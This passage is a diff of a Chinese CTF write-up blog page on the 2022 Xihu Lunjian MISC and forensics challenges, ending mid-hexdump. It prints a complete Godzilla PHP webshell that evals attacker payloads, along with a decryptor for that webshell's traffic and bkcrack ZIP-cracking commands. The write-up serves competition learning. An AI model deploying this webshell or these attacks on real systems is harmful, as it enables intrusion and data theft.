@@ -356,123 +356,168 @@
             
               <div class="markdown-body">
                 
-                <h1 id="2022西湖论剑MISC复现"><a href="#2022西湖论剑MISC复现" class="headerlink" title="2022西湖论剑MISC复现"></a>2022西湖论剑MISC复现</h1><p>强网杯快开始了，想着复现一下取证和misc的题目，刚好2022西湖论剑都有，而且难度也挺高</p>
-<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="mp3"><a href="#mp3" class="headerlink" title="mp3"></a><strong>mp3</strong></h2><p>拿到cipher.mp3，听一下，熟悉的可以一下分辨出这是<code>mp3stego</code>的默认加解密音频，因为没有密码，先看看010</p>
-<p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/170134897029315.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+                <h1 id="西湖论剑misc复现">2022西湖论剑MISC复现</h1>
+<p>强网杯快开始了，想着复现一下取证和misc的题目，刚好2022西湖论剑都有，而且难度也挺高</p>
+<h1 id="misc">MISC</h1>
+<h2 id="mp3"><strong>mp3</strong></h2>
+<p>拿到cipher.mp3，听一下，熟悉的可以一下分辨出这是<code>mp3stego</code>的默认加解密音频，因为没有密码，先看看010</p>
+<figure>
+<img src="../img/2022西湖论剑MISC复现/170134897029315.png" srcset="/img/loading.gif" lazyload alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>看到有个png，foremost分离一下</p>
-<p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702651.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure>
+<img src="../img/2022西湖论剑MISC复现/17013489702651.png" srcset="/img/loading.gif" lazyload alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>拿到只有黑白像素的png图片</p>
-<p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702662.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure>
+<img src="../img/2022西湖论剑MISC复现/17013489702662.png" srcset="/img/loading.gif" lazyload alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>按行转成010的二进制值然后再转成16进制数保存为文件看看</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Bash">from PIL import Image<br>import struct<br><br>img = Image.open(<span class="hljs-string">&#x27;00000646.png&#x27;</span>)<br>width, height = img.size<br><br>f = open(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">#按行读取</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> range(height):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(width):<br>        flag += str(img.getpixel((x, y))//255)  <span class="hljs-comment">#255//255 = 1 ; 0//255 = 0</span><br><span class="hljs-comment">#print(flag)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0, len(flag), 8):<br>    f.write(struct.pack(<span class="hljs-string">&#x27;B&#x27;</span>, int(flag[i:i+8], 2)))<br>f.close()<br></code></pre></td></tr></table></figure>
-
 <p><code>50 4B 03 04</code>拿到zip，里面有个加密的47.txt</p>
-<p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702663.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure>
+<img src="../img/2022西湖论剑MISC复现/17013489702663.png" srcset="/img/loading.gif" lazyload alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>尝试了一下不是伪加密，回到mp3stego，无密码直接解密得到压缩包密码<code>8750d5109208213f</code></p>
-<p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702664.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure>
+<img src="../img/2022西湖论剑MISC复现/17013489702664.png" srcset="/img/loading.gif" lazyload alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>拿到47.txt</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj<br></code></pre></td></tr></table></figure>
-
 <p>由47联想到rot47</p>
-<p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702665.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure>
+<img src="../img/2022西湖论剑MISC复现/17013489702665.png" srcset="/img/loading.gif" lazyload alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>类似jjencode，console直接解得到flag：DASCTF{f8097257d699d7fdba7e97a15c4f94b4}</p>
-<p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702666.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h2 id="take-the-zip-easy"><a href="#take-the-zip-easy" class="headerlink" title="take_the_zip_easy"></a>take_the_zip_easy</h2><p>拿到zipeasy.zip，里面是两个加密的文件，看到两个文件名字一样，猜想zip是pcapng压缩得到的，而且加密算法为ZipCrypto，有两段偏移可能相同，30-43：<code>64 61 73 66 6C 6F 77 2E 70 63 61 70 6E 67</code>，0-3：<code>50 4B 03 04 </code></p>
+<figure>
+<img src="../img/2022西湖论剑MISC复现/17013489702666.png" srcset="/img/loading.gif" lazyload alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<h2 id="take_the_zip_easy">take_the_zip_easy</h2>
+<p>拿到zipeasy.zip，里面是两个加密的文件，看到两个文件名字一样，猜想zip是pcapng压缩得到的，而且加密算法为ZipCrypto，有两段偏移可能相同，30-43：<code>64 61 73 66 6C 6F 77 2E 70 63 61 70 6E 67</code>，0-3：<code>50 4B 03 04</code></p>
 <p>尝试明文攻击</p>
-<p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/170134897026613.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure>
+<img src="../img/2022西湖论剑MISC复现/170134897026613.png" srcset="/img/loading.gif" lazyload alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p><code>bkcrack.exe -C zipeasy.zip -x 30 646173666C6F772E706361706E67 -x 0 504B0304 -c dasflow.zip</code></p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bkcrack</span> <span class="hljs-number">1</span>.<span class="hljs-number">5</span>.<span class="hljs-number">0</span> - <span class="hljs-number">2022</span>-<span class="hljs-number">07</span>-<span class="hljs-number">07</span><span class="hljs-meta"></span><br><span class="hljs-meta">[19:36:43] Z reduction using 6 bytes of known plaintext</span><br><span class="hljs-meta">100.0 % (6 / 6)</span><br><span class="hljs-meta">[19:36:43] Attack on 1038290 Z values at index 37</span><br><span class="hljs-meta">Keys: 2b7d78f3 0ebcabad a069728c</span><br><span class="hljs-meta">67.7 % (703384 / 1038290)</span><br><span class="hljs-meta">[19:41:03] Keys</span><br><span class="hljs-meta">2b7d78f3 0ebcabad a069728c</span><br></code></pre></td></tr></table></figure>
-
 <p><code>bkcrack.exe -C zipeasy.zip -c dasflow.zip -k 2b7d78f3 0ebcabad a069728c -d dasflow.zip</code></p>
 <p>得到dasflow.zip，解压得到dasflow.pcapng</p>
 <p>简单看看，比较明显是哥斯拉流量，里面还有个flag.zip，<code>stream 6</code>里有原始的webshell，可以看到key为<code>d8ea7326e6ec5916</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;air123&#x27;</span>;<br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;d8ea7326e6ec5916&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]),<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
-
 <p><code>stream 36</code>哥斯拉流量解密得到加密flag.zip的原始命令，得到密码<code>airDAS1231qaSW@</code></p>
-<p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/170134897026714.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure>
+<img src="../img/2022西湖论剑MISC复现/170134897026714.png" srcset="/img/loading.gif" lazyload alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>写脚本解密也行</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;d8ea7326e6ec5916&#x27;</span>;<br><br><span class="hljs-variable">$endata</span> = <span class="hljs-string">&#x27;J%2B5pNzMyNmU2mij7dMD%2FqHMAa1dTUh6rZrUuY2l7eDVot058H%2BAZShmyrB3w%2FOdLFa2oeH%2FjYdeYr09l6fxhLPMsLeAwg8MkGmC%2BNbz1%2BkYvogF0EFH1p%2FKFEzIcNBVfDaa946G%2BynGJob9hH1%2BWlZFwyP79y4%2FcvxxKNVw8xP1OZWE3&#x27;</span>;<br><span class="hljs-variable">$dedata</span> = <span class="hljs-title function_ invoke__">gzdecode</span>(<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$endata</span>))), <span class="hljs-variable">$key</span>));  <span class="hljs-comment">//urldecode会将+号解析成空格，导致无法解密，replace回去</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dedata</span>;<br><br><span class="hljs-comment">//cmdLinePsh -c &quot;cd &quot;/var/www/html/upload/&quot;;zip -o flag.zip /flag -P airDAS1231qaSW@&quot; 2&gt;&amp;1methodNameexecCommand</span><br></code></pre></td></tr></table></figure>
-
 <p>导出flag.zip，解压得到flag</p>
-<h1 id="Fornesics"><a href="#Fornesics" class="headerlink" title="Fornesics"></a>Fornesics</h1><h2 id="Isolated-Machine-Memory-Analysis"><a href="#Isolated-Machine-Memory-Analysis" class="headerlink" title="Isolated Machine Memory Analysis"></a>Isolated Machine Memory Analysis</h2><p>参考 <a target="_blank" rel="noopener" href="https://zysgmzb.club/index.php/archives/132">zysgmzb</a> <a target="_blank" rel="noopener" href="https://crazymanarmy.github.io/2023/02/03/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Misc-Isolated-Machine-Memory-Analysis-Writeup/">空白</a></p>
+<h1 id="fornesics">Fornesics</h1>
+<h2 id="isolated-machine-memory-analysis">Isolated Machine Memory
+Analysis</h2>
+<p>参考 <a
+target="_blank" rel="noopener" href="https://zysgmzb.club/index.php/archives/132">zysgmzb</a> <a
+target="_blank" rel="noopener" href="https://crazymanarmy.github.io/2023/02/03/第六届西湖论剑网络安全大赛-Misc-Isolated-Machine-Memory-Analysis-Writeup/">空白</a></p>
 <p>题目描述</p>
 <blockquote>
-<p>张三，现用名叫Charlie，在一家外企工作，负责flag加密技术的研究。为了避免flag泄露，这家企业制定了严格的安全策略，严禁flag离开研发服务器，登录服务器必须经过跳板机。张三使用的跳板机是一台虚拟机，虽然被全盘加密没法提取，但好消息是至少还没关机。 免责声明：本题涉及的人名、单位名、产品名、域名及IP地址等均为虚构，如有雷同纯属巧合。 注：本题模拟真实研发环境，解题有关的信息不会出现在人名、域名或IP地址等不合常理的地方。链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1WESej-pyjWKZni7drZGTig?pwd=cq46">https://pan.baidu.com/s/1WESej-pyjWKZni7drZGTig?pwd=cq46</a> 提取码：cq46</p>
+<p>张三，现用名叫Charlie，在一家外企工作，负责flag加密技术的研究。为了避免flag泄露，这家企业制定了严格的安全策略，严禁flag离开研发服务器，登录服务器必须经过跳板机。张三使用的跳板机是一台虚拟机，虽然被全盘加密没法提取，但好消息是至少还没关机。
+免责声明：本题涉及的人名、单位名、产品名、域名及IP地址等均为虚构，如有雷同纯属巧合。
+注：本题模拟真实研发环境，解题有关的信息不会出现在人名、域名或IP地址等不合常理的地方。链接：https://pan.baidu.com/s/1WESej-pyjWKZni7drZGTig?pwd=cq46
+提取码：cq46</p>
 </blockquote>
 <p>hint</p>
 <blockquote>
-<p>Hint: hint1:在张三的电脑上发现一张截图，看起来应该是配置跳板机时无意留下的。</p>
-<p><img src="/../img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/17013489702667.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>hint2:为什么这个Windows内存镜像是ELF格式？ hint3:<a target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/volatility/wiki/Virtual-Box-Core-Dump#meta-data">https://github.com/volatilityfoundation/volatility/wiki/Virtual-Box-Core-Dump#meta-data</a></p>
+<p>Hint:
+hint1:在张三的电脑上发现一张截图，看起来应该是配置跳板机时无意留下的。</p>
+<figure>
+<img src="../img/2022西湖论剑MISC复现/17013489702667.png" srcset="/img/loading.gif" lazyload alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>hint2:为什么这个Windows内存镜像是ELF格式？
+hint3:https://github.com/volatilityfoundation/volatility/wiki/Virtual-Box-Core-Dump#meta-data</p>
 </blockquote>
 <p>取证，但是拿到一个elf</p>
 <p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf imageinfo</code></p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Volatility Foundation Volatility Framework 2.6<br><span class="hljs-built_in">INFO</span>    : volatility.<span class="hljs-built_in">debug</span>    : Determining<span class="hljs-built_in"> profile </span>based on KDBG search<span class="hljs-built_in">..</span>.<br>          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418<br></code></pre></td></tr></table></figure>
-
 <p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 pslist</code></p>
 <p>其他的省略，重点看这几个，VBoxTray类似vmtool，VBoxService可以确定有VirtualBox，mstsc说明有远程桌面，ClipboardMonit使用了剪贴板</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Volatility Foundation Volatility Framework 2.6<br>Offset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit<br><br>------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------<br>...<br>0xfffffa8004d307a0 VBoxService.ex          648    460     13      116      0      0 2022-11-02 07:10:56 UTC+0000<br>...<br>0xfffffa800384d9b0 VBoxTray.exe           1884    300     12      138      1      0 2022-11-01 16:12:09 UTC+0000<br>...<br>0xfffffa8003854b00 ClipboardMonit         1516    300      1       47      1      0 2022-11-01 16:12:09 UTC+0000<br>...<br>0xfffffa80050f2b00 mstsc.exe              2840    300     14      715      1      0 2022-11-01 16:12:35 UTC+0000<br>...<br></code></pre></td></tr></table></figure>
-
 <p>先看剪贴板内容</p>
 <p><code>volatility_2.6_win64_standalone.exe -f CharlieBrown-PC.elf --profile=Win7SP1x64 clipboard</code></p>
 <figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">Volatility Foundation Volatility Framework 2</span><span class="hljs-string">.</span><span class="hljs-comment">6</span><br><span class="hljs-comment">Session    WindowStation Format                         Handle Object             Data</span><br><span class="hljs-literal">----------</span> <span class="hljs-literal">-------------</span> <span class="hljs-literal">------------------</span> <span class="hljs-literal">------------------</span> <span class="hljs-literal">------------------</span> <span class="hljs-literal">--------------------------------------------------</span><br>         <span class="hljs-comment">1 WinSta0       0xc009L                       0x901c1 0xfffff900c00e26b0</span><br>         <span class="hljs-comment">1 WinSta0       CF_TEXT                  0x7400000001</span> <span class="hljs-literal">------------------</span><br>         <span class="hljs-comment">1 WinSta0       CF_UNICODETEXT                0x7021f 0xfffff900c1df7970</span> <span class="hljs-literal">-----</span><span class="hljs-comment">BEGIN PUBLIC KEY</span><span class="hljs-literal">---</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-string">.</span><span class="hljs-literal">----</span><span class="hljs-comment">END PUBLIC KEY</span><span class="hljs-literal">-----</span><br>         <span class="hljs-comment">1 WinSta0       CF_TEXT                           0x0</span> <span class="hljs-literal">------------------</span><br>         <span class="hljs-comment">1 WinSta0       CF_LOCALE                         0x0</span> <span class="hljs-literal">------------------</span><br>         <span class="hljs-comment">1 WinSta0       0x0L                              0x0</span> <span class="hljs-literal">------------------</span><br>         <span class="hljs-comment">1</span> <span class="hljs-literal">-------------</span> <span class="hljs-literal">------------------</span>            <span class="hljs-comment">0x901a3 0xfffff900c01f2cc0</span><br></code></pre></td></tr></table></figure>
-
 <p>看到有rsa公钥开头的data，-v查看详细信息</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Volatility Foundation Volatility Framework 2.6<br>Session    WindowStation Format                         Handle Object             Data<br>---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------<br>         1 WinSta0       0xc009L                       0x901c1 0xfffff900c00e26b0<br>0xfffff900c00e26c4  5e 01 03 00 00 00 00 00                           ^.......<br>         1 WinSta0       CF_TEXT                  0x7400000001 ------------------<br>         1 WinSta0       CF_UNICODETEXT                0x7021f 0xfffff900c1df7970 -----BEGIN PUBLIC KEY---...----END PUBLIC KEY-----<br>0xfffff900c1df7984  2d 00 2d 00 2d 00 2d 00 2d 00 42 00 45 00 47 00   -.-.-.-.-.B.E.G.<br>0xfffff900c1df7994  49 00 4e 00 20 00 50 00 55 00 42 00 4c 00 49 00   I.N...P.U.B.L.I.<br>0xfffff900c1df79a4  43 00 20 00 4b 00 45 00 59 00 2d 00 2d 00 2d 00   C...K.E.Y.-.-.-.<br>0xfffff900c1df79b4  2d 00 2d 00 0d 00 0a 00 4d 00 46 00 6f 00 77 00   -.-.....M.F.o.w.<br>0xfffff900c1df79c4  44 00 51 00 59 00 4a 00 4b 00 6f 00 5a 00 49 00   D.Q.Y.J.K.o.Z.I.<br>0xfffff900c1df79d4  68 00 76 00 63 00 4e 00 41 00 51 00 45 00 42 00   h.v.c.N.A.Q.E.B.<br>0xfffff900c1df79e4  42 00 51 00 41 00 44 00 53 00 51 00 41 00 77 00   B.Q.A.D.S.Q.A.w.<br>0xfffff900c1df79f4  52 00 67 00 4a 00 42 00 41 00 49 00 45 00 5a 00   R.g.J.B.A.I.E.Z.<br>0xfffff900c1df7a04  54 00 78 00 78 00 6c 00 65 00 37 00 2b 00 35 00   T.x.x.l.e.7.+.5.<br>0xfffff900c1df7a14  72 00 79 00 77 00 43 00 35 00 62 00 79 00 49 00   r.y.w.C.5.b.y.I.<br>0xfffff900c1df7a24  75 00 42 00 6b 00 50 00 68 00 77 00 6b 00 79 00   u.B.k.P.h.w.k.y.<br>0xfffff900c1df7a34  76 00 35 00 37 00 52 00 0d 00 0a 00 37 00 35 00   v.5.7.R.....7.5.<br>0xfffff900c1df7a44  36 00 44 00 55 00 43 00 44 00 39 00 69 00 32 00   6.D.U.C.D.9.i.2.<br>0xfffff900c1df7a54  4d 00 57 00 59 00 79 00 55 00 73 00 30 00 41 00   M.W.Y.y.U.s.0.A.<br>0xfffff900c1df7a64  63 00 63 00 36 00 4a 00 5a 00 77 00 79 00 71 00   c.c.6.J.Z.w.y.q.<br>0xfffff900c1df7a74  56 00 4f 00 6d 00 52 00 37 00 34 00 75 00 4d 00   V.O.m.R.7.4.u.M.<br>0xfffff900c1df7a84  76 00 72 00 65 00 49 00 32 00 73 00 6c 00 6c 00   v.r.e.I.2.s.l.l.<br>0xfffff900c1df7a94  65 00 34 00 47 00 79 00 37 00 48 00 6c 00 36 00   